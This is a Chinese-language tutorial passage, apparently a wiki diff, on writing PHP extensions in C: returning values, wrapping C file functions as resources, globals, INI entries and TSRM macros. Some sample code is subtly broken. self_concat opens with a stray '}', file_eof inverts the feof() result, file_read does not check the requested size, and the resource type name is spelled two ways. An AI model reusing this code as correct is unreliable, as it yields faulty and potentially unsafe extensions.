+|RETURN_STRINGL(s, l, dup)|RETVAL_STRINGL(s, l, dup)|长度为l的字符串值。与上一个宏一样，但因为s的长度被指定，所以速度更快。|
+|RETURN_TRUE|RETVAL_TRUE|返回布尔值true。注意到这个宏没有括号。|
+|RETURN_FALSE|RETVAL_FALSE|返回布尔值false。注意到这个宏没有括号。|
+|RETURN_RESOURCE(r)|RETVAL_RESOURCE(r)|资源句柄。|
+===== 完成 self_concat() =====
+现在你已经学会了如何分配内存和从PHP扩展函数里返回函数值，那么我们就能够完成self_concat()的编码：
+
+
+<code>
+/* {{{ proto string self_concat(string str, int n)
+
+*/
+
+PHP_FUNCTION(self_concat)
+
+}
+
+char *str = NULL;
+
+int argc = ZEND_NUM_ARGS();
+
+int str_len;
+
+long n;
+
+char *result; /* Points to resulting string */
+
+char *ptr; /* Points at the next location we want to copy to */
+
+int result_length; /* Length of resulting string */
+
+if (zend_parse_parameters(argc TSRMLS_CC, "sl", &str, &str_len, &n) == FAILURE)
+
+return;
+
+/* Calculate length of result */
+
+result_length = (str_len * n);
+
+/* Allocate memory for result */
+
+result = (char *) emalloc(result_length + 1);
+
+/* Point at the beginning of the result */
+
+ptr = result;
+
+while (n--) {
+
+/* Copy str to the result */
+
+memcpy(ptr, str, str_len);
+
+/* Increment ptr to point at the next position we want to write to */
+
+ptr += str_len;
+
+}
+
+/* Null terminate the result. Always null-terminate your strings
+
+even if they are binary strings */
+
+*ptr = '\0';
+
+/* Return result to the scripting engine without duplicating it*/
+
+RETURN_STRINGL(result, result_length, 0);
+
+}
+
+/* }}} */
+</code>
+
+现在要做的就是重新编译一下PHP，这样就完成了第一个PHP函数。
+
+
+让我门检查函数是否真的工作。在最新编译过的PHP树下执行
+译者：可以使用phpcli程序在控制台里执行php文件。
+
+下面的脚本：
+
+
+<code>
+<?php
+for ($i = 1; $i <= 3; $i++){
+     print self_concat("ThisIsUseless", $i);
+     print "\n";
+}
+?>
+</code>
+
+你应该得到下面的结果：
+
+
+<code>
+ThisIsUseless
+
+ThisIsUselessThisIsUseless
+
+ThisIsUselessThisIsUselessThisIsUseless
+</code>
+
+===== 实例小结 =====
+你已经学会如何编写一个简单的PHP函数。回到本章的开头，我们提到用C编写PHP功能函数的两个主要的动机。第一个动机是用C实现一些算法来提高性能和扩展功能。前一个例子应该能够指导你快速上手这种类型扩展的开发。第二个动机是包裹三方函数库。我们将在下一步讨论。
+
+===== 引入第三方扩展 =====
+本节中你将学到如何编写更有用和更完善的扩展。该节的扩展包裹了一个C库，展示了如何编写一个含有多个互相依赖的PHP函数扩展。
+
+==== 动机 ====
+也许最常见的PHP扩展是那些包裹第三方C库的扩展。这些扩展包括MySQL或Oracle的数据库服务库，libxml2的         XML技术库，ImageMagick 或GD的图形操纵库。
+
+
+在本节中，我们编写一个扩展，同样使用脚本来生成骨架扩展，因为这能节省许多工作量。这个扩展包裹了标准C函数fopen(),         fclose(), fread(), fwrite()和 feof().
+
+
+扩展使用一个被叫做资源的抽象数据类型，用于代表已打开的文件FILE*。你会注意到大多数处理比如数据库连接、文件句柄等的PHP扩展使用了资源类型，这是因为引擎自己无法直接“理解”它们。我们计划在PHP扩展中实现的C         API列表如下：
+
+
+<code>
+FILE *fopen(const char *path, const char *mode);
+
+int fclose(FILE *stream);
+
+size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream);
+
+size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream);
+
+int feof(FILE *stream);
+</code>
+
+我们实现这些函数，使它们在命名习惯和简单性上符合PHP脚本。如果你曾经向PHP社区贡献过代码，你被期望遵循一些公共习俗，而不是跟随C库里的         API。并不是所有的习俗都写在PHP代码树的CODING_STANDARDS文件里。这即是说，此功能已经从PHP发展的很早阶段即被包含在PHP         中，并且与C库API类似。PHP安装已经支持fopen(), fclose()和更多的PHP函数。
+
+
+以下是PHP风格的API：
+
+
+<code>
+resource file_open(string filename, string mode)
+
+file_open() //接收两个字符串（文件名和模式），返回一个文件的资源句柄。
+
+bool file_close(resource filehandle)
+
+file_close() //接收一个资源句柄，返回真/假指示是否操作成功。
+
+string file_read(resource filehandle, int size)
+
+file_read() //接收一个资源句柄和读入的总字节数，返回读入的字符串。
+
+bool file_write(resource filehandle, string buffer)
+
+file_write() //接收一个资源句柄和被写入的字符串，返回真/假指示是否操作成功。
+
+bool file_eof(resource filehandle)
+
+file_eof()     //接收一个资源句柄，返回真/假指示是否到达文件的尾部。
+</code>
+
+因此，我们的函数定义文件——保存为ext/目录下的myfile.def——内容如下：
+
+
+<code>
+resource file_open(string filename, string mode)
+
+bool file_close(resource filehandle)
+
+string file_read(resource filehandle, int size)
+
+bool file_write(resource filehandle, string buffer)
+
+bool file_eof(resource filehandle)
+</code>
+
+下一步，利用ext_skel脚本在ext./ 原代码目录执行下面的命令：
+
+
+<code>
+./ext_skel --extname=myfile --proto=myfile.def
+</code>
+
+然后，按照前一个例子的关于编译新建立脚本的步骤操作。你会得到一些包含FETCH_RESOURCE()宏行的编译错误，这样骨架脚本就无法顺利完成编译。为了让骨架扩展顺利通过编译，把那些出错行
+译者：可以查看到生成的FETCH_RESOURCE()宏参数是一些’???’。 
+
+注释掉即可。
+
+
+==== 资源 ====
+资源是一个能容纳任何信息的抽象数据结构。正如前面提到的，这个信息通常包括例如文件句柄、数据库连接结构和其他一些复杂类型的数据。
+
+
+使用资源的主要原因是因为：资源被一个集中的队列所管理，该队列可以在PHP开发人员没有在脚本里面显式地释放时可以自动地被释放。
+
+
+举个例子，考虑到编写一个脚本，在脚本里调用mysql_connect()打开一个MySQL连接，可是当该数据库连接资源不再使用时却没有调用         mysql_close()。在PHP里，资源机制能够检测什么时候这个资源应当被释放，然后在当前请求的结尾或通常情况下更早地释放资源。这就为减少内存泄漏赋予了一个“防弹”机制。如果没有这样一个机制，经过几次web请求后，web服务器也许会潜在地泄漏许多内存资源，从而导致服务器当机或出错。
+
+
+==== 注册资源类型 ====
+如何使用资源？Zend引擎让使用资源变地非常容易。你要做的第一件事就是把资源注册到引擎中去。使用这个API函数：
+
+
+<code>
+int zend_register_list_destructors_ex(rsrc_dtor_func_t ld
+                                    , rsrc_dtor_func_t pld
+                                    , char *type_name
+                                    , int module_number)
+</code>
+
+这个函数返回一个资源类型id，该id应当被作为全局变量保存在扩展里，以便在必要的时候传递给其他资源API。ld：该资源释放时调用的函数。pld用于在不同请求中始终存在的永久资源，本章不会涉及。type_name是一个具有描述性类型名称的字符串，module_number为引擎内部使用，当我们调用这个函数时，我们只需要传递一个已经定义好的module_number变量。
+
+
+回到我们的例子中来：我们会添加下面的代码到myfile.c原文件中。该文件包括了资源释放函数的定义，此资源函数被传递给         zend_register_list_destructors_ex()注册函数（资源释放函数应该提早添加到文件中，以便在调用         zend_register_list_destructors_ex()时该函数已被定义）：
+
+
+<code>
+ static void myfile_dtor(zend_rsrc_list_entry *rsrc TSRMLS_DC){
+      FILE *fp = (FILE *) rsrc->ptr;
+      fclose(fp);
+ }
+</code>
+
+把注册行添加到PHP_MINIT_FUNCTION()后，看起来应该如下面的代码：
+
+
+<code>
+ PHP_MINIT_FUNCTION(myfile){
+      /* If you have INI entries, uncomment these lines
+      ZEND_INIT_MODULE_GLOBALS(myfile, php_myfile_init_globals,NULL);
+ 
+      REGISTER_INI_ENTRIES();
+      */
+  
+      le_myfile = zend_register_list_destructors_ex(myfile_dtor,NULL,"standard-c-file", module_number);
+  
+      return SUCCESS;
+ }
+</code>
+
+== Poznámka:  ==
+注意到le_myfile是一个已经被ext_skel脚本定义好的全局变量。
+
+PHP_MINIT_FUNCTION()是一个先于模块（扩展）的启动函数，是暴露给扩展的一部分API。下表提供可用函数简要的说明。
+
+
+
+Tabulka: **函数声明宏**
+
+|函数声明宏|语义|
+|PHP_MINIT_FUNCTION()|当PHP被装载时，模块启动函数即被引擎调用。这使得引擎做一些例如资源类型，注册INI变量等的一次初始化。|
+|PHP_MSHUTDOWN_FUNCTION()|当PHP完全关闭时，模块关闭函数即被引擎调用。通常用于注销INI条目|
+|PHP_RINIT_FUNCTION()|在每次PHP请求开始，请求前启动函数被调用。通常用于管理请求前逻辑。|
+|PHP_RSHUTDOWN_FUNCTION()|在每次PHP请求结束后，请求前关闭函数被调用。经常应用在清理请求前启动函数的逻辑。|
+|PHP_MINFO_FUNCTION()|调用phpinfo()时模块信息函数被呼叫，从而打印出模块信息。|
+新建和注册新资源 我们准备实现file_open()函数。当我们打开文件得到一个FILE         *，我们需要利用资源机制注册它。下面的主要宏实现注册功能：
+
+
+<code>
+ ZEND_REGISTER_RESOURCE(rsrc_result, rsrc_pointer, rsrc_type);
+</code>
+
+
+Tabulka: **ZEND_REGISTER_RESOURCE 宏参数**
+
+|宏参数|参数类型|
+|rsrc_result|zval *, which should be set with the registered                 resource information. zval * 设置为已注册资源信息|
+|rsrc_pointer|Pointer to our resource data. 资源数据指针|
+|rsrc_type|The resource id obtained when registering the resource                 type. 注册资源类型时获得的资源id|
+==== 文件函数 ====
+现在你知道了如何使用ZEND_REGISTER_RESOURCE()宏，并且准备好了开始编写file_open()函数。还有一个主题我们需要讲述。
+
+
+当PHP运行在多线程服务器上，不能使用标准的C文件存取函数。这是因为在一个线程里正在运行的PHP脚本会改变当前工作目录，因此另外一个线程里的脚本使用相对路径则无法打开目标文件。为了阻止这种错误发生，PHP框架提供了称作VCWD         （virtual current working directory         虚拟当前工作目录）宏，用来代替任何依赖当前工作目录的存取函数。这些宏与被替代的函数具备同样的功能，同时是被透明地处理。在某些没有标准C函数库平台的情况下，VCWD框架则不会得到支持。例如，Win32下不存在chown()，就不会有相应的VCWD_CHOWN()宏被定义。
+
+
+
+Tabulka: **VCWD列表**
+
+|标准C库|VCWD宏|
+|getcwd()|VCWD_GETCWD()|
+|fopen()|VCWD_FOPEN|
+|open()|VCWD_OPEN() //用于两个参数的版本|
+|open()|VCWD_OPEN_MODE() //用于三个参数的open()版本|
+|creat()|VCWD_CREAT()|
+|chdir()|VCWD_CHDIR()|
+|getwd()|VCWD_GETWD()|
+|realpath()|VCWD_REALPATH()|
+|rename()|VCWD_RENAME()|
+|stat()|VCWD_STAT()|
+|lstat()|VCWD_LSTAT()|
+|unlink()|VCWD_UNLINK()|
+|mkdir()|VCWD_MKDIR()|
+|rmdir()|VCWD_RMDIR()|
+|opendir()|VCWD_OPENDIR()|
+|popen()|VCWD_POPEN()|
+|access()|VCWD_ACCESS()|
+|utime()|VCWD_UTIME()|
+|chmod()|VCWD_CHMOD()|
+|chown()|VCWD_CHOWN()|
+==== 编写利用资源的第一个PHP函数 ====
+实现file_open()应该非常简单，看起来像下面的样子：
+
+
+<code>
+ PHP_FUNCTION(file_open){
+      char *filename = NULL;
+      char *mode = NULL;
+      int argc = ZEND_NUM_ARGS();
+      int filename_len;
+      int mode_len;
+      FILE *fp;
+  
+      if (zend_parse_parameters(argc TSRMLS_CC, "ss", &filename,&filename_len, &mode, &mode_len) == FAILURE) {
+           return;
+      }
+  
+      fp = VCWD_FOPEN(filename, mode);
+  
+      if (fp == NULL) {
+           RETURN_FALSE;
+      }
+  
+      ZEND_REGISTER_RESOURCE(return_value, fp, le_myfile);
+ }
+</code>
+
+你可能会注意到资源注册宏的第一个参数return_value，可此地找不到它的定义。这个变量自动的被扩展框架定义为zval *         类型的函数返回值。先前讨论的、能够影响返回值的RETURN_LONG()         和RETVAL_BOOL()宏确实改变了return_value的值。因此很容易猜到程序注册了我们取得的文件指针fp，同时设置         return_value为该注册资源。
+
+
+访问资源 需要使用下面的宏访问资源（参看表对宏参数的解释）
+
+
+<code>
+ZEND_FETCH_RESOURCE(rsrc, rsrc_type, passed_id
+                  , default_id, resource_type_name, resource_type);
+</code>
+
+
+Tabulka: **ZEND_FETCH_RESOURCE 宏参数**
+
+|参数|含义|
+|rsrc|资源值保存到的变量名。它应该和资源有相同类型。|
+|rsrc_type|rsrc的类型，用于在内部把资源转换成正确的类型|
+|passed_id|寻找的资源值(例如zval **)|
+|default_id|如果该值不为-1，就使用这个id。用于实现资源的默认值。|
+|resource_type_name|资源的一个简短名称，用于错误信息。|
+|resource_type|注册资源的资源类型id|
+使用这个宏，我们现在能够实现file_eof()：
+
+
+<code>
+ PHP_FUNCTION(file_eof){
+      int argc = ZEND_NUM_ARGS();
+      zval *filehandle = NULL;
+      FILE *fp;
+  
+      if (zend_parse_parameters(argc TSRMLS_CC, "r", &filehandle) ==FAILURE) {
+           return;
+      }
+  
+      ZEND_FETCH_RESOURCE(fp, FILE *, &filehandle, -1, "standard-c-file",le_myfile);
+  
+      if (fp == NULL){
+           RETURN_FALSE;
+      }
+  
+      if (feof(fp) <= 0) {
+      /* Return eof also if there was an error */
+           RETURN_TRUE;
+      }
+  
+      RETURN_FALSE;
+ }
+</code>
+
+==== 删除一个资源 ====
+通常使用下面这个宏删除一个资源：
+
+
+<code>
+ int zend_list_delete(int id)
+</code>
+
+传递给宏一个资源id，返回SUCCESS或者FAILURE。如果资源存在，优先从Zend资源列队中删除，该过程中会调用该资源类型的已注册资源清理函数。因此，在我们的例子中，不必取得文件指针，调用fclose()关闭文件，然后再删除资源。直接把资源删除掉即可。
+
+
+使用这个宏，我们能够实现file_close()：
+
+
+<code>
+ PHP_FUNCTION(file_close){
+      int argc = ZEND_NUM_ARGS();
+      zval *filehandle = NULL;
+  
+      if (zend_parse_parameters(argc TSRMLS_CC, "r", &filehandle) == FAILURE) {
+           return;
+      }
+  
+      if (zend_list_delete(Z_RESVAL_P(filehandle)) == FAILURE) {
+           RETURN_FALSE;
+      }
+  
+      RETURN_TRUE;
+ }
+</code>
+
+你肯定会问自己Z_RESVAL_P()是做什么的。当我们使用zend_parse_parameters()从参数列表中取得资源的时候，得到的是         zval的形式。为了获得资源id，我们使用Z_RESVAL_P()宏得到id，然后把id传递给zend_list_delete()。         有一系列宏用于访问存储于zval值（参考表的宏列表）。尽管在大多数情况下zend_parse_parameters()返回与c类型相应的值，我们仍希望直接处理zval，包括资源这一情况。
+
+
+
+Tabulka: **Zval访问宏**
+
+|宏|访问对象|C 类型|
+|Z_LVAL, Z_LVAL_P, Z_LVAL_PP|整型值|long|
+|Z_BVAL, Z_BVAL_P, Z_BVAL_PP|布尔值|zend_bool|
+|Z_DVAL, Z_DVAL_P, Z_DVAL_PP|浮点值|double|
+|Z_STRVAL, Z_STRVAL_P, Z_STRVAL_PP|字符串值|char *|
+|Z_STRLEN, Z_STRLEN_P, Z_STRLEN_PP|字符串长度值|int|
+|Z_RESVAL, Z_RESVAL_P,Z_RESVAL_PP|资源值|long|
+|Z_ARRVAL, Z_ARRVAL_P, Z_ARRVAL_PP|联合数组|HashTable *|
+|Z_TYPE, Z_TYPE_P, Z_TYPE_PP|Zval类型|Enumeration (IS_NULL, IS_LONG, IS_DOUBLE, IS_STRING,                 IS_ARRAY, IS_OBJECT, IS_BOOL, IS_RESOURCE)|
+|Z_OBJPROP, Z_OBJPROP_P, Z_OBJPROP_PP|对象属性hash（本章不会谈到）|HashTable *|
+|Z_OBJCE, Z_OBJCE_P, Z_OBJCE_PP|对象的类信息|zend_class_entry|
+==== 用于访问zval值的宏 ====
+所有的宏都有三种形式：一个是接受zval s，另外一个接受zval *s，最后一个接受zval         **s。它们的区别是在命名上，第一个没有后缀，zval *有后缀_P（代表一个指针），最后一个 zval **有后缀_PP（代表两个指针）。         现在，你有足够的信息来独立完成 file_read()和 file_write()函数。这里是一个可能的实现：
+
+<code>
+ PHP_FUNCTION(file_read){
+      int argc = ZEND_NUM_ARGS();
+      long size;
+      zval *filehandle = NULL;
+      FILE *fp;
+      char *result;
+      size_t bytes_read;
+  
+      if (zend_parse_parameters(argc TSRMLS_CC, "rl", &filehandle,&size) == FAILURE) {
+           return;
+      }
+  
+      ZEND_FETCH_RESOURCE(fp, FILE *, &filehandle, -1, "standard-cfile", le_myfile);
+  
+      result = (char *) emalloc(size+1);
+  
+      bytes_read = fread(result, 1, size, fp);
+  
+      result[bytes_read] = '\0';
+  
+      RETURN_STRING(result, 0);
+ }
+  
+ PHP_FUNCTION(file_write){
+      char *buffer = NULL;
+      int argc = ZEND_NUM_ARGS();
+      int buffer_len;
+      zval *filehandle = NULL;
+      FILE *fp;
+  
+      if (zend_parse_parameters(argc TSRMLS_CC, "rs", &filehandle,&buffer, &buffer_len) == FAILURE) {
+           return;
+      }
+  
+      ZEND_FETCH_RESOURCE(fp, FILE *, &filehandle, -1, "standard-cfile", le_myfile);
+  
+      if (fwrite(buffer, 1, buffer_len, fp) != buffer_len) {
+           RETURN_FALSE;
+      }
+  
+      RETURN_TRUE;
+ }
+</code>
+
+==== 测试扩展 ====
+你现在可以编写一个测试脚本来检测扩展是否工作正常。下面是一个示例脚本，该脚本打开文件test.txt，输出文件类容到标准输出，建立一个拷贝test.txt.new。
+
+<code>
+ <?php
+ $fp_in = file_open("test.txt", "r") or die("Unable to open input file\n");
+  
+ $fp_out = file_open("test.txt.new", "w") or die("Unable to open output file\n");
+  
+ while (!file_eof($fp_in)) {
+      $str = file_read($fp_in, 1024);
+      print($str);
+      file_write($fp_out, $str);
+ }
+  
+ file_close($fp_in);
+ file_close($fp_out);
+ ?>
+</code>
+
+===== 全局变量 =====
+你可能希望在扩展里使用全局C变量，无论是独自在内部使用或访问php.ini文件中的INI扩展注册标记（INI在下一节中讨论）。因为PHP是为多线程环境而设计，所以不必定义全局变量。PHP提供了一个创建全局变量的机制，可以同时应用在线程和非线程环境中。我们应当始终利用这个机制，而不要自主地定义全局变量。用一个宏访问这些全局变量，使用起来就像普通全局变量一样。
+
+
+用于生成myfile工程骨架文件的ext_skel脚本创建了必要的代码来支持全局变量。通过检查php_myfile.h文件，你应当发现类似下面的被注释掉的一节.
+
+
+<code>
+ ZEND_BEGIN_MODULE_GLOBALS(myfile)
+  
+ int global_value;
+ char *global_string;
+  
+ ZEND_END_MODULE_GLOBALS(myfile)
+</code>
+
+你可以把这一节的注释去掉，同时添加任何其他全局变量于这两个宏之间。文件后部的几行，骨架脚本自动地定义一个MYFILE_G(v)宏。这个宏应当被用于所有的代码，以便访问这些全局变量。这就确保在多线程环境中，访问的全局变量仅是一个线程的拷贝，而不需要互斥的操作。
+
+
+为了使全局变量有效，最后需要做的是把myfile.c 注释去掉。
+
+
+<code>
+ ZEND_DECLARE_MODULE_GLOBALS(myfile)
+</code>
+
+你也许希望在每次PHP请求的开始初始化全局变量。另外，做为一个例子，全局变量已指向了一个已分配的内存，在每次PHP请求结束时需要释放内存。为了达到这些目的，全局变量机制提供了一个特殊的宏，用于注册全局变量的构造和析构函数（参考表对宏参数的说明）：
+
+
+<code>
+ ZEND_INIT_MODULE_GLOBALS(module_name, globals_ctor, globals_dtor)
+</code>
+
+
+Tabulka: **表 ZEND_INIT_MODULE_GLOBALS 宏参数**
+
+|参数|含义|
+|module_name|与传递给ZEND_BEGIN_MODULE_GLOBALS()宏相同的扩展名称。|
+|globals_ctor|构造函数指针。在myfile扩展里，函数原形与void               php_myfile_init_globals(zend_myfile_globals               *myfile_globals)类似|
+|globals_dtor|析构函数指针。例如，php_myfile_init_globals(zend_myfile_globals               *myfile_globals)|
+你可以在myfile.c里看到如何使用构造函数和ZEND_INIT_MODULE_GLOBALS()宏的示例。
+
+
+===== 添加自定义INI指令 =====
+INI文件(php.ini)的实现使得PHP扩展注册和监听各自的INI条目。如果这些INI条目由php.ini、Apache的htaccess或其他配置方法来赋值，注册的INI变量总是更新到正确的值。整个INI框架有许多不同的选项以实现其灵活性。我们涉及一些基本的（也是个好的开端），借助本章的其他材料，我们就能够应付日常开发工作的需要。
+
+
+通过在PHP_INI_BEGIN()/PHP_INI_END()宏之间的STD_PHP_INI_ENTRY()宏注册PHP       INI指令。例如在我们的例子里，myfile.c中的注册过程应当如下：
+
+
+<code>
+ PHP_INI_BEGIN()
+  
+ STD_PHP_INI_ENTRY("myfile.global_value", "42", PHP_INI_ALL, OnUpdateInt, global_value, zend_myfile_globals, myfile_globals)
+  
+ STD_PHP_INI_ENTRY("myfile.global_string", "foobar", PHP_INI_ALL, OnUpdateString, global_string, zend_myfile_globals, myfile_globals)
+  
+ PHP_INI_END()
+</code>
+
+除了STD_PHP_INI_ENTRY()其他宏也能够使用，但这个宏是最常用的，可以满足大多数需要（参看表对宏参数的说明）：
+
+
+<code>
+STD_PHP_INI_ENTRY(name, default_value
+                 , modifiable, on_modify
+                 , property_name, struct_type, struct_ptr)
+</code>
+
+
+Tabulka: **STD_PHP_INI_ENTRY 宏参数表**
+
+|参数|含义|
+|name|INI条目名|
+|default_value|如果没有在INI文件中指定，条目的默认值。默认值始终是一个字符串。|
+|modifiable|设定在何种环境下INI条目可以被更改的位域。可以的值是：PHP_INI_SYSTEM. 能够在php.ini或http.conf等系统文件更改PHP_INI_PERDIR. 能够在 .htaccess中更改PHP_INI_USER. 能够被用户脚本更改PHP_INI_ALL. 能够在所有地方更改 |
+|on_modify |处理INI条目更改的回调函数。你不需自己编写处理程序，使用下面提供的函数。包括：OnUpdateIntOnUpdateStringOnUpdateBoolOnUpdateStringUnemptyOnUpdateReal |
+|property_name |应当被更新的变量名|
+|struct_type |变量驻留的结构类型。因为通常使用全局变量机制，所以这个类型自动被定义，类似于zend_myfile_globals。|
+|struct_ptr |全局结构名。如果使用全局变量机制，该名为myfile_globals。|
+最后，为了使自定义INI条目机制正常工作，你需要分别去掉PHP_MINIT_FUNCTION(myfile)中的       REGISTER_INI_ENTRIES()调用和PHP_MSHUTDOWN_FUNCTION(myfile)中的       UNREGISTER_INI_ENTRIES()的注释。
+
+
+访问两个示例全局变量中的一个与在扩展里编写MYFILE_G(global_value)       和MYFILE_G(global_string)一样简单。
+
+
+如果你把下面的两行放在php.ini中，MYFILE_G(global_value)的值会变为99。
+
+
+<code>
+; php.ini – The following line sets the INI entry myfile.global_value to 99.
+myfile.global_value = 99
+</code>
+
+===== 线程安全资源管理宏 =====
+现在，你肯定注意到以TSRM（线程安全资源管理器）开头的宏随处使用。这些宏提供给扩展拥有独自的全局变量的可能，正如前面提到的。
+
+
+当编写PHP扩展时，无论是在多进程或多线程环境中，都是依靠这一机制访问扩展自己的全局变量。如果使用全局变量访问宏（例如MYFILE_G()宏），需要确保TSRM上下文信息出现在当前函数中。基于性能的原因，Zend引擎试图把这个上下文信息作为参数传递到更多的地方，包括       PHP_FUNCTION()的定义。正因为这样，在PHP_FUNCTION()内当编写的代码使用访问宏（例如MYFILE_G()宏）时，不需要做任何特殊的声明。然而，如果PHP函数调用其他需要访问全局变量的C函数，要么把上下文作为一个额外的参数传递给C函数，要么提取上下文（要慢点）。
+
+
+在需要访问全局变量的代码块开头使用TSRMLS_FETCH()来提取上下文。例如：
+
+
+<code>
+ void myfunc(){
+      TSRMLS_FETCH();
+  
+      MYFILE_G(myglobal) = 2;
+ }
+</code>
+
+如果希望让代码更加优化，更好的办法是直接传递上下文给函数（正如前面叙述的，PHP_FUNCTION()范围内自动可用）。可以使用       TSRMLS_C（C表示调用Call）和TSRMLS_CC（CC边式调用Call和逗号Comma）宏。前者应当用于仅当上下文作为一个单独的参数，后者应用于接受多个参数的函数。在后一种情况中，因为根据取名，逗号在上下文的前面，所以TSRMLS_CC不能是第一个函数参。
+
+
+在函数原形中，可以分别使用TSRMLS_D和TSRMLS_DC宏声名正在接收上下文。 
+
+
+下面是前一例子的重写，利用了参数传递上下文：
+
+
+<code>
+ void myfunc(TSRMLS_D){
+      MYFILE_G(myglobal) = 2;
+ }
+  
+ PHP_FUNCTION(my_php_function)
+ {
+      …
+      myfunc(TSRMLS_C);
+      …
+ }
+</code>
+
+====== 总 结 ======
+现在，你已经学到了足够的东西来创建自己的扩展。本章讲述了一些重要的基础来编写和理解PHP扩展。Zend引擎提供的扩展API相当丰富，使你能够开发面向对象的扩展。几乎没有文档谈几许多高级特性。当然，依靠本章所学的基础知识，你可以通过浏览现有的原码学到很多。
+
+
+更多关于信息可以在PHP手册的扩展PHP章节
+**http://www.php.net/manual/en/zend.php**中找到。另外，你也可以考虑加入PHP开发者邮件列表internals@     lists.php.net，该邮件列表围绕开发PHP 本身。你还可以查看一下新的扩展生成工具——PECL_Gen(
+**http://pear.php.net/package/PECL_Gen**)，这个工具正在开发之中，比起本章使用的ext_skel有更多的特性。
+
+
+binary safe
+二进制安全
+
+context
+上下文
+
+extensions
+扩展
+
+entry
+条目
+
+skeleton
+骨架
+
+Thread-Safe Resource Manager TSRM
+线程安全资源管理器
+
